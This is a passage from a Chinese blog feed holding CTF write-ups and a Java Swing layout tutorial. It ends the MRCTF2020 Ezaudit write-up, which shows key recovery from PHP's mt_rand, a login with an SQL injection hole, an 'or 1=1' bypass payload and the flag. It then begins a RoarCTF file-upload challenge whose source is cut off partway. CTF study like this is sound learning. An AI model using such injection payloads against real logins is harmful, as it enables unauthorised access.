class="token comment">//genarate private_key</span><span class="token keyword">function</span> <span class="token function">private_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$strings2</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$private_key</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$private_key</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$private_key</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">private_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>效果如下<br><img src="/2020/11/09/MRCTF2020-Ezaudit/4.png" alt></p><p>所以私钥的值如下<br><pre class="line-numbers language-$private_key" data-language="$private_key"><code class="language-$private_key">XuNhoueCDCGc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h2 id="5-得flag"><a href="#5-得flag" class="headerlink" title="5.得flag"></a>5.得flag</h2><p>再回到前面的判断<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$Private_key</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'Private_key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">==</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'*************'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'************'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$getuser</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">.</span><span class="token single-quoted-string string">';'</span><span class="token punctuation">;</span>         <span class="token variable">$link</span><span class="token operator">=</span><span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"test"</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$getuser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysql_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;tr>&lt;td>"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/td>&lt;td>"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/td>&lt;td>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>得出payload为<br><pre class="line-numbers language-none"><code class="language-none">admin1&#39; or &#39;1&#39;&#x3D;&#39;1XuNhoueCDCGc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><img src="/2020/11/09/MRCTF2020-Ezaudit/5.png" alt><br>在<code>login.html</code>页面上传数据获得flag</p><p><strong>capture the flag</strong><br><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;b9149181-4ac6-4487-ae22-fdd6428f2f63&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>]]></content>
      
      
      
        <tags>
            
            <tag> php伪随机数 </tag>
            
            <tag> 万能密码 </tag>
            
            <tag> php_mt_seed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA图形界面之三种pane布局方式</title>
      <link href="2020/11/08/JAVA%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E4%B9%8Bpane%E5%B8%83%E5%B1%80/"/>
      <url>2020/11/08/JAVA%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E4%B9%8Bpane%E5%B8%83%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>以何种距离，用何种方式，怎样措辞，如何面对。</p></blockquote><h2 id="基于JFrame的图形界面"><a href="#基于JFrame的图形界面" class="headerlink" title="基于JFrame的图形界面"></a>基于JFrame的图形界面</h2><p>最近在学JFrame，下面用这篇博客来记一下学习笔记，主要关于的是今天学到的比较印象深刻的代码及其中的细节吧。</p><h3 id="pane面板布局及三种布局管理器"><a href="#pane面板布局及三种布局管理器" class="headerlink" title="pane面板布局及三种布局管理器"></a>pane面板布局及三种布局管理器</h3><p>这里的三种布局管理器分别为<code>流布局管理器FlowLayout</code>、<code>边布局管理器BorderLayout</code>、<code>网格布局管理器GridLayout</code></p><p>这种布局管理器怎样进行设置呢？<strong>就用下面的代码</strong><br><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getContentPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GridLayout</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//设置网格布局，其中为2行1列</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>其余的布局设置亦相似与上面的设置方法，下面解释一下各块的意义<br><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getContentPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//代表主的内容面板，这里当然也可以是向下的各级内容面板</span><span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token punctuation">)</span>             <span class="token comment">//设置布局的函数，是panel类所具有的方法。</span><span class="token keyword">new</span> <span class="token class-name">GridLayout</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">//表示创建了个两行一列的网格布局管理器。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><h3 id="panel套panel"><a href="#panel套panel" class="headerlink" title="panel套panel"></a>panel套panel</h3><p>这里主要用于分布复杂的软件，有上有下这样的，（目前只学了这种设置组件的位置的控制方式。<br><strong>主的contentpane套pane</strong><br><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">JPanel</span> jp1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JPanel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//新建一个内容面板jp1</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getContentPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>jp1<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//将这个内容面板添加（add）到主的内容面板（this.getContentPane()）之内</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><p>其他的各级的pane相互套的方式与之类似。</p><h3 id="代码与效果图"><a href="#代码与效果图" class="headerlink" title="代码与效果图"></a>代码与效果图</h3><p><strong>别的不多说了，上今天的代码与所实现的效果图</strong></p><blockquote><p>这里我把类分为了两个，懒得再合并为一个文件了，就这样吧！一个文件(类)为<code>Window1.java</code>；另一个文件(类)为<code>Window2.java</code>。</p><p><font color="red">这里我设置的包名为JFrameTest3如下图，(红色提示)</font></p></blockquote><p><img src="/2020/11/08/JAVA%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E4%B9%8Bpane%E5%B8%83%E5%B1%80/2.png" alt></p><p><strong>pay attention this is the first file</strong><br><code>Window1.java</code><br><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">JFrameTest3</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token class-name">JFrameTest2</span><span class="token punctuation">.</span>window<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Window1</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// TODO Auto-generated method stub</span><span class="token keyword">new</span> <span class="token class-name">Window2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><strong>this is the second</strong></p><p><code>Window2.java</code><br><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">JFrameTest3</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">BorderLayout</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Button</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Color</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">GridLayout</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JButton</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JFrame</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JPanel</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Window2</span> <span class="token keyword">extends</span> <span class="token class-name">JFrame</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token class-name">Window2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//**下面为通用开头*/</span><span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">"JFrame测试"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setBounds</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getContentPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setBackground</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span>gray<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setDefaultCloseOperation</span><span class="token punctuation">(</span>EXIT_ON_CLOSE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//**下面是网格布局（第一布局）*/</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getContentPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GridLayout</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//**下面是上面的部分（即为第一步分开上面的部分）*/</span><span class="token class-name">JPanel</span> jp1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JPanel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getContentPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>jp1<span class="token punctuation">)</span><span class="token punctuation">;</span>jp1<span class="token punctuation">.</span><span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BorderLayout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//**设置上面的左右（或者说东、西？）部分为按钮1、4*/</span>jp1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"this is button1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"West"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jp1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"this is button4"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"East"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//**中间的部分（这里设置为一个面板，再向面板之中添加其他组件）*/</span><span class="token class-name">JPanel</span> jp1_2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JPanel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//jp1_2加入到面板1中，并且放到中间</span>jp1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>jp1_2<span class="token punctuation">,</span> <span class="token string">"Center"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//设置为网格布局，并且向该面板之中添加两个按钮2、3</span>jp1_2<span class="token punctuation">.</span><span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GridLayout</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jp1_2<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"this is button2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jp1_2<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"this is button3"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//**添加下面的部分的面板*/</span><span class="token class-name">JPanel</span> jp2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JPanel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getContentPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>jp2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置为边布局管理器，并添加按钮5、10与面板的左右部分</span>jp2<span class="token punctuation">.</span><span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BorderLayout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jp2<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"this is button5"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"West"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jp2<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"this is button10"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"East"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//面板之中添加另一面板</span><span class="token class-name">JPanel</span> jp2_1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JPanel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里设置为网格布局</span>jp2_1<span class="token punctuation">.</span><span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GridLayout</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//也放在中间</span>jp2<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>jp2_1<span class="token punctuation">,</span> <span class="token string">"Center"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在网格布局管理器里面添加四个按钮6、7、8、9</span>jp2_1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"this is buuton6"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jp2_1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"this is buuton7"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jp2_1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"this is buuton8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jp2_1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"this is buuton9"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setVisible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>~上面的两个文件里面也都打上注释了，这里就不再继续解释了，如有人看到哪里错了或者不懂请联系我~，<strong>~ps：我是一个负责任的男人~</strong></p><h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p>下面是效果图，没写多少内容，只提供参考<br><img src="/2020/11/08/JAVA%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E4%B9%8Bpane%E5%B8%83%E5%B1%80/1.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件开发 </tag>
            
            <tag> JAVA </tag>
            
            <tag> JFrame图形界面 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF-2019-Simple-Upload</title>
      <link href="2020/11/08/RoarCTF-2019-Simple-Upload/"/>
      <url>2020/11/08/RoarCTF-2019-Simple-Upload/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>老歌再听</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=184467&auto=1&height=66"></iframe><h2 id="1-源码"><a href="#1-源码" class="headerlink" title="1.源码"></a>1.源码</h2><p>下面给出的是源码<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$uploadFile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$uploadFile</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Think<span class="token punctuation">\</span>Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 实例化上传类</span>        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">maxSize</span>  <span class="token operator">=</span> <span class="token number">4096</span> <span class="token punctuation">;</span><span class="token comment">// 设置附件上传大小</span>        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">allowExts</span>  <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'gif'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置附件上传类型</span>        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rootPath</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'./Public/Uploads/'</span><span class="token punctuation">;</span><span class="token comment">// 设置附件上传目录</span>        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">savePath</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token comment">// 设置附件上传子目录</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 上传错误提示错误信息</span>          <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token 